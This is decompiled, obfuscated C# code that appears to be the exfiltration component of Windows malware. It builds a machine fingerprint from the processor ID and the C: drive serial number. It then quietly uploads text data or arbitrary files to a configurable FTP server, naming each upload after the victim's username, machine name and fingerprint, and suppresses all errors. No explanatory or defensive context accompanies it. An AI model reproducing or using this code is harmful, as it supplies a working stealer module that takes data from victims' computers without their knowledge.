using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace JcxFVLIspytryi;

internal sealed class tPndXEuPmLa
{
	public static string ljIJDDyiJOl()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = "C";
		ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		return text3 + text;
	}

	public static void UCwBrNBearIWr(string wEbWcLyqtdLQR = "URL", string yrGFBkqbZgwSvo = "USERNAME", string QMtnxyZiUFuu = "ACCESO", string aQXWObzqjfU = "")
	{
		try
		{
			string text = ljIJDDyiJOl();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(wEbWcLyqtdLQR + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(yrGFBkqbZgwSvo, QMtnxyZiUFuu);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(aQXWObzqjfU);
			ftpWebRequest.ContentLength = bytes.Length;
			using (Stream stream = ftpWebRequest.GetRequestStream())
			{
				stream.Write(bytes, 0, bytes.Length);
			}
			using ((FtpWebResponse)ftpWebRequest.GetResponse())
			{
			}
		}
		catch
		{
		}
	}

	public static void TJxuBJNPuwUc(string FJLALNzgEIw = "URL", string UiTNffTDYKwcbP = "USERNAME", string FgviQtemmsc = "ACCESO", string aMTofAXVyz = "")
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.Credentials = new NetworkCredential(UiTNffTDYKwcbP, FgviQtemmsc);
			webClient.UploadFile(FJLALNzgEIw + string.Format("UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + Path.GetFileName(aMTofAXVyz)), "STOR", aMTofAXVyz);
		}
		catch
		{
		}
	}
}
